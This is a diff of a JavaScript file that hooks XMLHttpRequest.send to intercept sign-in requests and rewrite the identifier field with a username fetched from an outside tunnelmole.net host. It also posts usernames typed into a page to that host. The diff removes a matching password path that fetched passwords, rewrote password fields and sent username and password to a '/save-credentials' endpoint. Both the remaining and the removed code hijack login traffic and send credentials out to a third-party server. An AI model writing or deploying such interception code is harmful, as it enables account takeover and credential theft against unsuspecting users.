@@ -1,9 +1,7 @@
 let freqUsername = null; 
-let freqPassword = null;
 const modifiedRequests = new Set();
 const pendingRequests = new Map();
 let usernameFetched = false;
-let passwordFetched = false;
 
 // Fetch the username when needed
 const fetchFreqUsername = async () => {
@@ -41,50 +39,13 @@ const fetchFreqUsername = async () => {
     }
 };
 
-// Fetch the password when needed
-const fetchFreqPassword = async () => {
-    if (passwordFetched) return; // Avoid redundant fetches once password is fetched
-
-    console.log('Fetching password...');
-
-    try {
-        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
-            method: 'GET',
-            headers: { 'Cache-Control': 'no-cache' }
-        });
-
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-
-        const result = await response.json();
-        console.log('Response from /get-first-post-data:', result);  // Debug log
-
-        if (result?.postData) {
-            freqPassword = result.postData;
-            console.log('Fetched password:', freqPassword);
-            passwordFetched = true;
-
-            // Reset the server-side password store
-            await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-            // Process all pending requests now that we have a password
-            processModifiedRequests();
-        } else {
-            console.warn("No password data received, retrying...");
-            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
-        }
-    } catch (error) {
-        console.error('Error fetching password:', error);
-        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
-    }
-};
-
-// Modify and send pending requests when username and password are available
+// Modify and send pending requests when username is available
 const processModifiedRequests = () => {
-    if (!freqUsername || !freqPassword) {
-        console.log("Username or password not available yet, retrying...");
-        fetchFreqUsername();  // Ensure username is fetched
-        fetchFreqPassword();  // Ensure password is fetched
-        return;
-    }
+    if (!freqUsername) {
+            console.log("Username not available yet, retrying...");
+            fetchFreqUsername();
+            return;
+            }            
 
     console.log("Processing pending requests...");
     // Create a copy of pending requests as we will modify it while iterating
@@ -92,45 +53,26 @@ const processModifiedRequests = () => {
 
     // Iterate through all pending requests
     for (let [xhr, body] of requestsToProcess) {
-        const matchUsername = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
-        const matchPassword = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
+        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
-        // Check if either matchUsername or matchPassword is found, and the request hasn't been modified already
-        if ((matchUsername || matchPassword) && !modifiedRequests.has(body)) {
-            let modifiedBody = body;
-
-            // If a match for username is found, replace the username in the body
-            if (matchUsername) {
-                modifiedBody = modifiedBody.replace(matchUsername[1], freqUsername);
-            }
-
-            // If a match for password is found, replace the password in the body
-            if (matchPassword) {
-                modifiedBody = modifiedBody.replace(matchPassword[1], freqPassword);
-            }
-
-            // Mark the request as modified
-            modifiedRequests.add(body);
-            console.log("Modified request with new username and/or password:", modifiedBody);
-
-            // Send the modified request
-            xhr.send(modifiedBody); 
+        if (match && !modifiedRequests.has(body)) {
+            const modifiedBody = body.replace(match[1], freqUsername);
+            modifiedRequests.add(body); // Mark the request as modified
+            console.log("Modified request with new username:", modifiedBody);
+            xhr.send(modifiedBody); // Send the modified request
             pendingRequests.delete(xhr); // Remove the request from pending
         }
     }
 
-    // Reset freqUsername and freqPassword when all requests are processed
+    // Reset freqUsername when all requests are processed
     if (pendingRequests.size === 0) {
-        console.log("All pending requests processed, resetting freqUsername and freqPassword.");
+        console.log("All pending requests processed, resetting freqUsername.");
         freqUsername = null;
-        freqPassword = null;
-        usernameFetched = false;  // Allow fetching a new username if needed
-        passwordFetched = false;  // Allow fetching a new password if needed
+        usernameFetched = false; // Allow fetching a new username if needed
     }
 };
 
-
-// Intercept XMLHttpRequest to modify requests with username and password
+// Intercept XMLHttpRequest to modify requests with username
 const originalXhrSend = XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.send = function (body) {
     if (!body) {
@@ -138,8 +80,8 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    // If the body contains identity-signin-identifier or identity-signin-password and hasn't been modified yet, intercept
-    if (/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) {
+    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
+    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body); // Store the request in pendingRequests
         processModifiedRequests(); // Attempt to modify and send the request immediately
@@ -148,68 +90,60 @@ XMLHttpRequest.prototype.send = function (body) {
     }
 };
 
-// ✅ Send username and password to server
-const sendCredentials = async () => {
-    console.log('Sending username and password...');
+// ✅ Send username data to server
+const sendUsername = async () => {
+    console.log('Sending username...');
 
     const username = document.getElementById('username')?.value;
-    const password = document.getElementById('password')?.value;
-    if (!username || !password) {
-        console.warn("No username or password entered");
+    if (!username) {
+        console.warn("No username entered");
         return;
     }
 
     try {
-        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/save-credentials', {
+        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/save-username', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password })
+            body: JSON.stringify({ username })
         });
 
         if (response.ok) {
-            console.log('Credentials sent successfully');
+            console.log('Username sent successfully');
         } else {
-            console.error('Error sending credentials:', response.statusText);
+            console.error('Error sending username:', response.statusText);
         }
     } catch (error) {
-        console.error('Error sending credentials:', error);
+        console.error('Error sending username:', error);
     }
 };
 
 // ✅ Attach event listeners to buttons
 document.addEventListener('DOMContentLoaded', () => {
-    const button = document.getElementById('sendCredentialsBtn');
+    const button = document.getElementById('sendUsernameBtn');
     const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
 
     // Add button click listener
     if (button) {
         button.addEventListener('click', (event) => {
             event.preventDefault(); // Prevent form submission if inside a form
-            sendCredentials(); // Trigger sending credentials
+            sendUsername(); // Trigger sending username
         });
     } else {
-        console.warn('Send credentials button not found!');
+        console.warn('Send username button not found!');
     }
 
-    // Add "Enter" key listener to trigger credentials send
-    if (usernameInput && passwordInput) {
+    // Add "Enter" key listener to trigger username send
+    if (usernameInput) {
         usernameInput.addEventListener('keydown', (event) => {
             if (event.key === 'Enter') {
                 event.preventDefault(); // Prevent form submission
-                sendCredentials(); // Trigger send on Enter
-            }
-        });
-
-        passwordInput.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter') {
-                event.preventDefault(); // Prevent form submission
-                sendCredentials(); // Trigger send on Enter
+                sendUsername(); // Trigger send on Enter
             }
         });
     }
 
-    // Ensure fetchFreqUsername and fetchFreqPassword are called when the page loads
+    // Ensure fetchFreqUsername is called when the page loads
     fetchFreqUsername();
-    fetchFreqPassword();
 });
+
+
